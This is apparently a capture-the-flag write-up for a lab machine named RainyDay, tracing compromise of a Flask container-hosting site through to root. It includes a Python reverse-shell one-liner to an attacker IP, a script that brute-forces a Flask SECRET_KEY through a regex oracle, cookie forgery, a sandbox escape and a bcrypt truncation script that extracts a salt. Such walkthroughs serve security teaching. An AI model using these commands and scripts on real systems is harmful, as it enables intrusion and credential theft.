---
description: Decent Linux machine with a not so straightforward Python heavy exploit path.
---

# RainyDay

## Gaining Access

As usual, an Nmap scan to find the ports listening on this:

<figure><img src="../../../.gitbook/assets/image (3220).png" alt=""><figcaption></figcaption></figure>

When trying to access the HTTP website, the website domain is rainycloud.htb. Add that to the hosts file and move on.

### RainyCloud - Port 80

Viewing the webpage, we can see some sort of docker container application:

<figure><img src="../../../.gitbook/assets/image (1939).png" alt=""><figcaption></figcaption></figure>

This looks like some sort of Flask application because of the background. Anyways we can look around this website and also gobuster it for directories. We should take note of the user, which is 'jack' and his container name.

Gobuster did not find much, but did find an /api endpoint:

<figure><img src="../../../.gitbook/assets/image (2876).png" alt=""><figcaption></figcaption></figure>

Enumeration of vhosts also revealed the dev.rainycloud.htb domain.

<figure><img src="../../../.gitbook/assets/image (1699).png" alt=""><figcaption></figcaption></figure>

Investigating the login function, we can see that on a failed attempt, this appears within the page source.

<figure><img src="../../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

Pretty much confirms that this is a Flask application with app.py being used.

### Dev Vhost

There's some form of WAF or ACL on the dev endpoint.

<figure><img src="../../../.gitbook/assets/image (1614).png" alt=""><figcaption></figcaption></figure>

This looks bypassable using SSRF, but I was unable to make it work.

### API Endpoint

There was a /api endpoint found on the website, and I plan to fuzz that. I used feroxbuster for the recursive abilities.

<figure><img src="../../../.gitbook/assets/image (699).png" alt=""><figcaption></figcaption></figure>

This turned out to be a bit fruitless, because I was unable to even find anything of interest. I tried some extensions of my own and found one that works (out of sheer luck).

<figure><img src="../../../.gitbook/assets/image (2409).png" alt=""><figcaption></figcaption></figure>

Using this method, I was able to make out that there were 3 users, because entering /api/4 would return nothing. So we know that the last parameter should be a number of some sort. I tried out loads of numbers but nothing was returned. It wasn't until I decided to try using 1.0 and it worked...

<figure><img src="../../../.gitbook/assets/image (3642).png" alt=""><figcaption></figcaption></figure>

&#x20;I was able to get out the remaining hashes, which were for **root and gary.** We can crack these using john. Only one of them was crackable, and it was gary's.

<figure><img src="../../../.gitbook/assets/image (2159).png" alt=""><figcaption></figcaption></figure>

So his password is rubberducky. With these credentials, we can log in to the website as gary.

### Container Creation

Within the login, we are able to simply register and start a new docker container.

<figure><img src="../../../.gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

Within each docker container, we can basically get RCE on it. This can be done using the execute command button. I found that using the one without the background creates a very unstable shell, so use the other one.

<figure><img src="../../../.gitbook/assets/image (1531).png" alt=""><figcaption></figcaption></figure>

We can use this reverse shell command:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

<figure><img src="../../../.gitbook/assets/image (2082).png" alt=""><figcaption></figcaption></figure>

## Pivoting

Now, we need to think about how to use this container to find out more about the machine. Firstly, I took a look around at the IP addresses and found out that I should be scanning the other containers present on this network using some tunneling. What gave it away for me was the IP address ending in 3, meaning there are probably other hosts on this.

<figure><img src="../../../.gitbook/assets/image (2163).png" alt=""><figcaption></figcaption></figure>

As such, I transferred chisel over to this machine and created a tunnel.

<figure><img src="../../../.gitbook/assets/image (1338).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1171).png" alt=""><figcaption></figcaption></figure>

Now that we have this, we can begin to enumerate the network inside. We can do a quick ping sweep to see what's alive in there.

Most likely, the first host is 172.18.0.1 (based on other HTB machines), so I started there. I tested if port 22 and 80 were open, similar to the original ports open from our first nmap scan. And they were indeed open.

<figure><img src="../../../.gitbook/assets/image (1815).png" alt=""><figcaption></figcaption></figure>

We can then curl this address to see what's going on within it.

<figure><img src="../../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

Odd, it refers us back to the original website. Earlier, we found a dev.rainycloud.htb endpoint, which was situated on the original machine. This got me thinking about where this website was hosted, and if 172.18.0.1:80 is open, it could mean that dev.rainycloud.htb is hosted there and we can try to connect to it.

Now, we can try to directly pivot to it.

<figure><img src="../../../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

We also need to add the correct domain to our hosts file.

<figure><img src="../../../.gitbook/assets/image (3247).png" alt=""><figcaption></figcaption></figure>

Then we can connect to the dev portal.

<figure><img src="../../../.gitbook/assets/image (1922).png" alt=""><figcaption></figcaption></figure>

### Dev Portal

We can klook around this thing. Understanding that previously, there was an /api endpoint being used, I decided to look there again.

<figure><img src="../../../.gitbook/assets/image (1671).png" alt=""><figcaption></figcaption></figure>

Now we can fuzz the /api endpoint more to hopefully find something new. After a long while, I did find a new endpoint at /api/healthcheck.

<figure><img src="../../../.gitbook/assets/image (4027).png" alt=""><figcaption></figcaption></figure>

Visiting this page gave me this JSON object:

<figure><img src="../../../.gitbook/assets/image (1704).png" alt=""><figcaption></figcaption></figure>

The last part is the most interesting because it contains some form of regex pattern and its a custom type. This page looks to be appears to be telling us parameters for a POST request perhaps.

Was kinda right in this case, but it appears we are not authenticated.

<figure><img src="../../../.gitbook/assets/image (1601).png" alt=""><figcaption></figcaption></figure>

We can try to grab the Cookie from the session earlier on the main website as gary, and it works.

<figure><img src="../../../.gitbook/assets/image (2266).png" alt=""><figcaption></figcaption></figure>

So now we know there's an app.py, meaning there's also probably some kind of secret.py because this is a flask application.

<figure><img src="../../../.gitbook/assets/image (692).png" alt=""><figcaption><p>\</p></figcaption></figure>

Playing around with this some more, it appears that the 'custom' type would require a pattern, indicating to me this could be searching for regex in files. The reuslt of true / false would tell us whether the character was in it.

<figure><img src="../../../.gitbook/assets/image (2915).png" alt=""><figcaption></figcaption></figure>

So now, we would need to create some form of script to brute force out the characters of the SECRET_KEY, because that's needed to decode the cookie and (maybe)_ get a password.

### Brute Force SECRET\_KEY

We can create a really quick python script the brute forcing to get the key.

```python
import string
import requests
import json

chars = string.printable
cookies = {'session': 'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y28liQ.M3OPi3eJ7xcaUmaC0eENYqtHnu4'}

s = requests.Session()
pattern = ""

while True:
    for c in chars:
        try:
            rsp = s.post('http://dev.rainycloud.htb:3333/api/healthcheck', {
                'file': '/var/www/rainycloud/secrets.py',
                'type': 'custom',
                'pattern': "^SECRET_KEY = '" + pattern + c + ".*"
            }, cookies=cookies)
            if json.loads(rsp.content)['result']:
                pattern += c
                print(pattern)
                break
            else:
               pass
               # print(c)
        except Exception:
            print(rsp.content)
```

This would generate the SECRET\_KEY accordingly.

<figure><img src="../../../.gitbook/assets/image (2465).png" alt=""><figcaption></figcaption></figure>

Now, we can actually generate another cookie to login as jack and gain RCE as jack.

<figure><img src="../../../.gitbook/assets/image (1675).png" alt=""><figcaption></figcaption></figure>

Replace the cookies and now we can have RCE as jack using the container he created.

<figure><img src="../../../.gitbook/assets/image (3768).png" alt=""><figcaption></figcaption></figure>

### Jack's Container

Now that we are on jack's container, we can upload some form of pspy process monitor. Understanding that there's no more need to pivot back to another container, we should view what's going on in this current container.

What we see is this command:

<figure><img src="../../../.gitbook/assets/image (2670).png" alt=""><figcaption></figcaption></figure>

Weird that the sleep is this long. We can investigate this process in the /proc directory.

<figure><img src="../../../.gitbook/assets/image (3535).png" alt=""><figcaption></figcaption></figure>

There's this root directory within the process, and when going into it we are presented with another Linux / directory. This would contain the user flag and also jack's actual home directory.

<figure><img src="../../../.gitbook/assets/image (1397).png" alt=""><figcaption></figcaption></figure>

Also contains jack's private SSH key.

<figure><img src="../../../.gitbook/assets/image (2532).png" alt=""><figcaption></figcaption></figure>

With this, we can finally SSH into the main machine as jack.

<figure><img src="../../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1241).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

When checking sudo privileges, we see this:

<figure><img src="../../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>

I wasn't sure what safe\_python was, but it looked to be some kind of binary. I was also unable to check it out and see what it does. Really weird. But it did seem to open files and accept something as a parameter to open.

<figure><img src="../../../.gitbook/assets/image (3637).png" alt=""><figcaption></figcaption></figure>

I think this executes scripts of some kind, because upon creating some fake file, I saw this:

<figure><img src="../../../.gitbook/assets/image (3990).png" alt=""><figcaption></figcaption></figure>

There's an exec( ) function being called, which is always interesting. This binary seems to execute python code within a set environment or something. My guess is that we need to create a python script that would execute to get us a shell as jack\_adm.

The next few tests confirms this:

<figure><img src="../../../.gitbook/assets/image (3830).png" alt=""><figcaption></figcaption></figure>

There seem to be some keywords being filtered out, most notably 'import' because I cannot run anything that has import within it.&#x20;

### Python Sandbox Escape

As it turns out, this is a form of Python Sandbox Escape challenge, and it's really interesting as it shows us a lot of what's going under the hood with Python.

I found this a good read:

{% embed url="https://stackoverflow.com/questions/73043035/what-is-class-base-subclasses" %}

So there are a bunch of different subclasses, and this binary is executing something using the exec( ) function. There are also likely some filters.&#x20;

I tested a bunch of payloads from here:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes" %}

However, none from HackTricks really worked. I was wondering which subclass we should use, so I dumped all of them out. Judging from all the import failures I was having, I think we don't have any `__builtins__` to work with here. SO we need to figure out how to load the 'os' module and then execute commands with it.

I found this page particularly useful:

{% embed url="https://hexplo.it/post/escaping-the-csawctf-python-sandbox/" %}

I utilised their method and managed to get the index for this. This was 144.

<figure><img src="../../../.gitbook/assets/image (4072).png" alt=""><figcaption></figcaption></figure>

Right, so we need to somehow make use of this to import the os library. I could technically import one character each from each of the classes and then spell out 'import os', but that would be...very very long.

Ther ehas to be a way to load the module I want. Eventually, after a few hours of tinkering with this (and by hours I mean like literally 2 days), I got it to work!

<figure><img src="../../../.gitbook/assets/image (959).png" alt=""><figcaption></figcaption></figure>

We can then get RCE as jack\_adm.

<figure><img src="../../../.gitbook/assets/image (1732).png" alt=""><figcaption></figcaption></figure>

### Hash\_password.py

After getting to jack\_adm, we can check sudo privileges again to see this:

<figure><img src="../../../.gitbook/assets/image (3223).png" alt=""><figcaption></figcaption></figure>

Another blind Sudo challenge in Python.  Except, all this does is hash passwords for us into Bcrypt format.

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

This is, without question, similar to the initial hashes we found in the website. We probably need to crack the root hash we found a lot earlier to get get a root shell via SSH.&#x20;

Now that we have this, we would need to somehow find out the salt for this password before cracking it. There is a length limit of 30 for this script.&#x20;

### Bcrypt Exploit

These were good reads:

{% embed url="https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length" %}

{% embed url="https://www.mscharhag.com/software-development/bcrypt-maximum-password-length" %}

Anyways, what I understand is that Bcrypt has a maximum size of 72 bytes. This program that we are running checks for the length of the input, but not the size. Meaning, we can theoretically input more than 72 bytes. When we input more than 72 bytes, the string that gets hashed is truncated at the 72nd byte. This means that the salt, which is normally appended at the back, would get removed.

I used an online UTF-8 generator to try and find a valid combiantion of characters that would suffice for testing.

{% embed url="https://onlineutf8tools.com/generate-random-utf8" %}

Here are 2 instances of using UTF characters in hashing this algorithm with the machine's script. If you were to verify these two hashes, they would be identical. The 123456 is not hashed in the end, because we have entered more than 72 bytes of data.&#x20;

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

We could theoretically generate an input of 71 bytes, and then leave the last character to the salt and repeatedly brute force all the possible characters one by one. So with each character we find, we need to edit our input accordingly to have 1 less byte and to fit the flag there. I quickly created a script to test this, and this was the final result:

```python
#!/usr/bin/python3

import bcrypt
import string
passwd = u'痊茼ﶉ呍ᑫ䞫빜逦ᒶ덋䊼鏁耳䢈筮鰽Ἀᒅaa' #randomly generated
hashed_passwd = u'$2b$05$/vRnmg4ma.8Nkl4FBmWfze.ts9jKrY5tNqqoenp5WN3ZtHxRU8NmC' # taken from sudo as adm user
allchars = string.printable
flag = 'H34vyR41n'
for c in allchars:
	testpasswd = passwd + flag + c
	if bcrypt.checkpw(testpasswd.encode('utf-8'),hashed_passwd.encode('utf-8')):
		print("match at " + c)
```

This would output something like this:

<figure><img src="../../../.gitbook/assets/image (2966).png" alt=""><figcaption></figcaption></figure>

H is the first character of the salt. Repeated tests of this script shows that the first character of this hash does not change, indicating the salt is static and not randomly generated. We can thus pull out the salt char by char.&#x20;

We can keep dragging out the next few characters by changing the hashed password and the plaintext password, removing 1 byte at a time and adding one to our flag variable.&#x20;

<figure><img src="../../../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

'H34vyR41n' is the final salt, and now we can crack the original hash for root we found earlier.

We can generate a wordlist with rockyou.txt with the new salt at the back.

<figure><img src="../../../.gitbook/assets/image (2411).png" alt=""><figcaption></figcaption></figure>

And we can crack that hash easily to find the root password.

<figure><img src="../../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

Then we can su to root and grab our flag.

<figure><img src="../../../.gitbook/assets/image (3862).png" alt=""><figcaption></figcaption></figure>
